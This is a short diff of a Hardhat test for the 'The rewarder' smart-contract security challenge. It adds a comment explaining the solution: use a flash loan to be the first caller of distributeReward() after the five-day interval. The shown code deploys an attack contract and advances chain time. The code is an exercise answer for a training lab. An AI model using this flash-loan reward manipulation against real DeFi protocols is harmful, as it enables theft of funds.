@@ -66,6 +66,11 @@ describe('[Challenge] The rewarder', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        /**
+         * @notice the solution is really straight forward in the code 
+         * what should we do is be the first who operate distributeReward() in 5 days interval
+         * we simply start with no token but we can use the flash loan to do that.
+         */
         const AttackFactory = await ethers.getContractFactory("TheRewarderAttack",attacker);
         this.attackContract = await AttackFactory.deploy(this.flashLoanPool.address,this.rewarderPool.address,this.liquidityToken.address,this.rewardToken.address);
         await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60])
